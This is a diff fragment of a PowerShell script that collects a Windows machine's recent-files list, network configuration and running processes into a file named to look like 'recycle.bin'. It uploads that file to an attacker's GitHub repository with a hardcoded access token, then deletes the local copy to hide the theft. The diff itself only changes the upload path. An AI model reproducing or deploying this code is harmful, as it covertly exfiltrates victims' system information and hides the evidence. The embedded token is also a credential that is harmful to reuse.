@@ -41,7 +41,7 @@ function git-uploadfile {
 
 $helping=$env:appdata+'\recycle.bin';$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'));$ic = ipconfig /all;ac $helping $rc -Encoding 'utf8';ac $helping $ic;$gp=Get-process;ac $helping $gp;   
 
-git-uploadfile -token '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' -file $helping -owner foxstarter -repo tory -path mybox -force
+git-uploadfile -token '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' -file $helping -owner foxstarter -repo tory -path cycle -force
  
 Remove-Item $helping -force;
 
